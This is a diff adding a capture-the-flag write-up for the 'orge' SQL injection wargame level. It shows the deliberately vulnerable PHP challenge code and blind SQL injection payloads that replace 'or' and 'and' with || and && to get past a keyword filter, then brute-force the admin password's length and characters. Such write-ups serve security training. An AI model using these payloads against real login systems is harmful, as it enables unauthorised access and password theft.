@@ -1,0 +1,44 @@
+```php
+query : select id from prob_orge where id='guest' and pw=''
+<?php 
+  include "./config.php"; 
+  login_chk(); 
+  $db = dbconnect(); 
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
+  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
+  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
+  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
+  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
+  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
+   
+  $_GET[pw] = addslashes($_GET[pw]); 
+  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
+  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
+  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
+  highlight_file(__FILE__); 
+?>
+```
+
+Explain:
+
+This lab filter like `level 6 Darkelf`
+
+but now, `pw` must be the same with `pw` get from client
+
+```php
+ if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge");
+```
+
+Solve:
+
+using payload to brute forcing length of password
+
+`a' || 1=1 && id='admin' && length(pw)=1#`
+
+using payload to get password from `admin` (substr || &&)
+
+`a' || 1=1 && id='admin' && ascii(substr(pw,1,1))=1#`
+
+[script exploit poc](scripting/l7-orge.py)
+
+END
